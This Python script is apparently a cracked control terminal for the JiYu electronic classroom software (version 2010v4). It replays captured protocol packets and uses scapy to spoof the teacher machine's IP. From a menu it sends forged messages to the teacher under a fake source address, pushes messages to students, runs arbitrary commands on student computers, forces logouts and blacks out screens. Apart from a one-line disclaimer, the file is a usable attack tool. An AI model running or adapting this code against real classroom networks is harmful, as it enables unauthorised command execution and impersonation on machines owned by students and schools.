import socket
import threading
import scapy.all as scapy
import time

class NEKO_JY_CONTROL:
    data_channel_FLAG = 0
    CTL_PORT_FLAG = 1
    version = {
        "2010v4":{
            "send_msg_to_client":(
                ("4d4553530100000001000000c0a8ab8591030000000800000000000005000000",1),
                ("00",929)
            ),
            "send_msg_to_group":(
                ("4d4553530100000002000000c0a8ab85c0a8ab8691030000000800000000000005000000",1),
                ("00",897)
            ),
            "send_command_to_client":(
                ("444d4f43000001006e030000a9fe729ef0af0c4384dadde56ef1ba5e204e0000c0a8ab83610300006103000000020000000000000f00000001000000",1),
                (None,284),
                ("00000200",57),
                (None,334)
            ),
            "send_msg_to_teacher":(
                ("4d4553530100000001000000c0a8ab8391030000000800000000000001000000",1),
                ("00",897)
            ),
            "black_screen":(
                ("4d4553530100000002000000c0a8ab85c0a8ab860d000000200000000000009001",0),
            ),
            "unblack_screen":(
                ("4d4553530100000001000000c0a8ab860d000000200000000000009001",0),
            ),
            "logout":(
                ("4c4f474f01000000",1),
            ),
            "login":(
                ("4f4f4e430000010010000000196d6af9295bb946ab958a143ecddc26%IP%010000000100000000000000",data_channel_FLAG),#上线通知包1 x 3
                ("4e414e43000001001b000000196d6af9295bb946ab958a143ecddc2601000400%IP%01000000010000000180085e0000ae03105100",data_channel_FLAG),#上线通知包2 x 3
                ("414e4e4f01000000",CTL_PORT_FLAG),#上线通知包3 x 3
                ("574143410000010008000000196d6af9295bb946ab958a143ecddc26%IP%01000000",data_channel_FLAG), #学生机注册响应包
                ("414e4e4f01000000010000000000000000000000%IP%0000000000000000000000000000000000000000000000000000000000000000ae03105100400100",data_channel_FLAG),
                ("574143410000010008000000196d6af9295bb946ab958a143ecddc26%IP%01000000",data_channel_FLAG),
                ("4e414e430000010027000000196d6af9295bb946ab958a143ecddc2601020500c%IP%01000000010000000180085e0000000c29cb9d36000c292239feae03105100",data_channel_FLAG),
                ("01005e020201000c298d749208004500005cd047000040115b1ac0a8ab83e1020201040a15880048d93d414e4e4f01000000010000000000000000000000%IP%0000000000000000000000000000000000000000000000000000000000000000ae03105100400100",CTL_PORT_FLAG)
            )
        },
        "default":{
            "send_msg_to_client":(
                ("444d4f43000001009e030000108fe83e766eb34a9e0905a4c78e4a64204e0000dac3d5589103000091030000000800000000000005000000",1),
                ("00",898)
            ),
            "send_command_to_client":(
                ("444d4f43000001006e0300002ad498cb7a405b46b0c685d4dfa717ee204e0000dac3d558610300006103000000020000000000000f00000001000000",1),
                (None,513),
                ("00000200",0),
                (None,333)
            ),
            "send_msg_to_teacher":(
                ("4d4553530100000001000000dac3d55891030000000800000000000001000000",1),
                ("00",897)
            ),
            "black_screen":(
                ("4d4553530100000001000000%ID%27000000200000000000008001000000010000000a00000000000000ffffff0000000000747320",0)
            ),
            "unblack_screen":(
                ("4d4553530100000001000000%ID%0d000000200000000000009001",0)
            )
        }
    }
    def __init__(self,teacher_ip="192.168.171.131",local_ip="192.168.171.1",msg_channel=("225.2.2.1",5512),data_channel=("224.60.60.41",4605),version="2010v4"):
        self.teacher_ip = teacher_ip
        self._version = version
        self._run = True
        self.local_ip = local_ip
        self.stu_list = {}


        self._socket = {
            "msg_channel":{"socket":socket.socket(socket.AF_INET,socket.SOCK_DGRAM),"address":msg_channel[0],"port":msg_channel[1]},
            "data_channel":{"socket":socket.socket(socket.AF_INET,socket.SOCK_DGRAM),"address":data_channel[0],"port":data_channel[1]}
        }
        for i in self._socket:
            this_socket = self._socket[i]['socket']
            this_socket.bind(("0.0.0.0",self._socket[i]['port']))
            this_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            this_socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
            this_socket.setsockopt(
                socket.IPPROTO_IP,
                socket.IP_ADD_MEMBERSHIP,
                socket.inet_aton(self._socket[i]['address']) + socket.inet_aton("0.0.0.0")
            )
            this_socket.setblocking(False)
        self._scapy = scapy
        threading.Thread(target=self.server_thread,args=(self._socket['msg_channel'],)).start()
        threading.Thread(target=self.server_thread,args=(self._socket['data_channel'],)).start()
    
    def close(self):
        self._run = False
        self.logout()

    def ip2str(self,ip):
        ip = ip.split(".")
        return "%02x%02x%02x%02x"%(int(ip[0]),int(ip[1]),int(ip[2]),int(ip[3]))

    def getStuList(self):
        return self.stu_list

    def server_thread(self,this_sock):
        s = this_sock['socket']
        while self._run:
            try:
                data,addr = s.recvfrom(2048)
                if data[:4] == b"KACA":
                    if data[-4:].hex() not in self.stu_list:
                        self.stu_list[(data[-4:]).hex()] = addr
                    
                    this_version = self.version[self._version]
                    this_package = this_version['login']
                    re_data = bytes.fromhex(this_package[4][0].replace("%IP%",self.ip2str(self.local_ip)))
                
                    # self._socket.sendto(re_data,addr)
                elif data[:4] == b"ANNO":
                    # print("ANNO",data[-10:])
                    pass
                elif data[:4] == b"MESS":
                    pass
                elif data[:4] == b"LOGO":
                    pass
                else:
                    print(addr[0],data)
            except BaseException as ex:
                pass


    def send_by_socket(self,interface,data,dst,src):
        sock = self._socket[interface]
        if dst is None:
            dst = (sock['address'],int(sock['port']))
        elif dst[1] == 0:
            dst = (dst[0],int(sock['port']))
        sock['socket'].sendto(data,dst)

    def send_by_scapy(self,interface,data,dst,src):
        if interface is not None:
            sock = self._socket[interface]
            if dst is None:
                dst = (sock['address'],sock['port'])
            elif dst[1] == 0:
                dst = (dst[0],sock['port'])
        print("send_by_scapy",dst)
        self._scapy.send(self._scapy.IP(src=src[0],dst=dst[0])/self._scapy.UDP(sport=src[1],dport=dst[1])/data)

    def login(self):
        return
        this_version = self.version[self._version]
        this_package = this_version['login']
        send = self.send_by_multi_socket
        for __ in range(6):
            for i in range(2):            
                data = bytes.fromhex(this_package[i][0].replace("%IP%",self.ip2str(self.local_ip)))
                port =  self.data_channel if this_package[i][1] == self.data_channel_FLAG else self.msg_channel 
                send(data,self._socket)
                time.sleep(1)
            
            data = bytes.fromhex(this_package[2][0].replace("%IP%",self.ip2str(self.local_ip)))
            port =  self.data_channel if this_package[2][1] == self.data_channel_FLAG else self.msg_channel 
            send(data,self.control_multicast,port)
            time.sleep(1)
        

    def logout(self,target=None):
        if target is None:
            target = self._socket['msg_channel']['address']
        this_version = self.version[self._version]
        this_package = this_version['logout']
        data = bytes.fromhex(this_package[0][0])
        self.send_by_scapy("msg_channel",data,dst=(target,0),src=(self.teacher_ip,self._socket['msg_channel']['port']))
        self.send_by_socket("msg_channel",data,dst=(target,0),src=())


    def data_to_unicode_hex(self,data):
        ret_data = []
        unicode = data.encode("unicode-escape")
        unicode = str(unicode)[2:-1]
        c = 0
        while c < len(unicode):
            if unicode[c:c+3] == "\\\\u":
                c += 3
                ret_data.append(int(unicode[c+2:c+4],16))
                ret_data.append(int(unicode[c:c+2],16))
                c += 4
            else:
                ret_data.append(unicode[c].encode()[0])
                ret_data.append(0)
                c += 1
        out = b""
        for i in ret_data:
            out += i.to_bytes(length=1,byteorder='big',signed=False)
        return out

    def send_msg_to_client(self,target,info):
        dst = (target,0)
        send = self.send_by_scapy
        info = self.data_to_unicode_hex(info)
        this_version = self.version[self._version]
        this_package = this_version['send_msg_to_client']
        data =  bytes.fromhex(this_package[0][0])
        data += info
        data += b"\x00"*(this_package[1][1] - len(info))
        send("msg_channel",data,dst=dst,src=(self.teacher_ip,self._socket['msg_channel']['port']))

    def send_msg_to_group(self,info):
        dst = (self._socket['msg_channel']['address'],self._socket['msg_channel']['port'])
        send = self.send_by_socket
        info = self.data_to_unicode_hex(info)
        this_version = self.version[self._version]
        this_package = this_version['send_msg_to_group']
        data =  bytes.fromhex(this_package[0][0])
        data += info
        data += b"\x00"*(this_package[1][1] - len(info))
        send("msg_channel",data,dst=dst,src=(self.teacher_ip,self._socket['msg_channel']['port']))


    def send_command_to_client(self,target,command,args=""):
        if target is None:
            dst = None
            send = self.send_by_socket
        else:
            dst = (target,0)
            send = self.send_by_scapy
        command = self.data_to_unicode_hex(command)
        args = self.data_to_unicode_hex(args)
        this_version = self.version[self._version]
        this_package = this_version['send_command_to_client']
        data = bytes.fromhex(this_package[0][0])
        data += command
        data += b"\x00"*(this_package[1][1]-len(command))
        data += bytes.fromhex(this_package[2][0])*this_package[2][1]
        data += args
        data += b"\x00"*(this_package[3][1]-len(args))
        send("data_channel",data,dst=dst,src=(self.teacher_ip,self._socket['data_channel']['port']))

    def send_msg_to_teacher(self,fake_ip,info):
        send = self.send_by_scapy
        info = self.data_to_unicode_hex(info)
        this_version = self.version[self._version]
        this_package = this_version['send_msg_to_teacher']
        data =  bytes.fromhex(this_package[0][0])
        data += info
        data += b"\x00"*(this_package[1][1] - len(info))
        send("msg_channel",data,dst=(self.teacher_ip,0),src=(fake_ip,self._socket['msg_channel']['port']))

    #暂时没法用，需要获取主机的id号，暂时无解，通过混杂模式也许可以解决
    def black_screen(self,mode):
        this_version = self.version[self._version]
        send = self.send_by_scapy
        data = b""
        if mode == 0:
            this_package = this_version['black_screen']
            data = this_package[0][0]
        else:
            this_package = this_version['unblack_screen']
            data = this_package[0][0]
        data = bytes.fromhex(data)
        send("data_channel",data,dst=("192.168.171.134",5512),src=("192.168.171.131",1038))

def menu():
    print("1. 发送信息给教师机")
    print("2. 发送信息给指定学生机器")
    print("3. 发送信息给任意学生机器")
    print("4. 学生机命令执行")
    print("5. 强制登出")
    print("6. 登录")
    print("7. 获取学生机列表")
    print("9. 退出")
    try:
        return int(input(">"))
    except:
        return -1

def main():
    print("+"+"-"*60+"+")
    print("|                    极域电子教室破解版终端                  |")
    print("+"+"-"*60+"+")
    print("|                       Power On nekokami                    |")
    print("+"+"-"*60+"+")
    print("| 1.当前支持版本:2010v4、等                                  |")
    print("| 2.本脚本只用于技术交流使用，禁止用于违法用途               |")
    print("| 3.本脚本使用时请确保已将代码中对应参数修改                 |")
    print("+"+"-"*60+"+")
    teacher_ip = "192.168.171.131"      #修改为你教室的教师端地址，可通过抓包获得
    multicast_ip = "225.2.2.1"          #修改为你教室的组播地址，可通过抓包获得
    msg_channel = ("225.2.2.1",5512)                     #修改为你教室的组播地址，可通过抓包获得
    data_channel = ("224.60.60.41",4605)                     #修改为你教室的组播地址，可通过抓包获得
    version = "2010v4"
    nekoc = NEKO_JY_CONTROL(teacher_ip=teacher_ip,version=version,msg_channel=msg_channel,data_channel=data_channel)
    nekoc.login()
    while True:
        try:
            s = menu()
            if s == 1:
                print("[+] 发送信息给教师机")
                fake_ip = input("请输入伪造的IP>")
                msg = input("请输入要发送的内容>")
                nekoc.send_msg_to_teacher(fake_ip,msg)
            elif s == 2:
                print("[+] 发送信息给指定学生机器")
                addr = input("请输入IP>")
                msg = input("请输入要发送的内容>")
                nekoc.send_msg_to_client(addr,msg)
            elif s  == 3:
                print("[+] 发送信息给任意学生机器(组播)")
                msg = input("请输入要发送的内容>")
                nekoc.send_msg_to_group(msg)
            elif s == 4:
                print("[+] 学生机命令执行")
                addr = input("请输入IP>")
                command = input("请输入要执行的命令>")
                args = input("请输入要执行命令的参数>")
                nekoc.send_command_to_client(addr,command,args)
            elif s == 5:
                print("[+] 强制登出")
                addr = input("请输入IP>")
                if len(addr) == 0:
                    addr = None
                nekoc.logout(addr)
            elif s == 6:
                print("[+]","上线")
                addr = input("请输入IP>")
                if len(addr) == 0:
                    addr = None
                nekoc.login(addr)
            elif s == 7:
                print("[+]","获取学生列表")
                stu_list = nekoc.getStuList()
                print(stu_list)
            elif s == 8:
                print("[+]","黑屏肃静")
                mode = int(input("黑[0]/关闭[1]"))
                nekoc.black_screen(mode)
            elif s == 9:
                nekoc.close()
                break
            else:
                print("未知指令")
        except KeyboardInterrupt:
            break
        except BaseException as ex:
            print(ex)
            pass


if __name__ == "__main__":
    main()

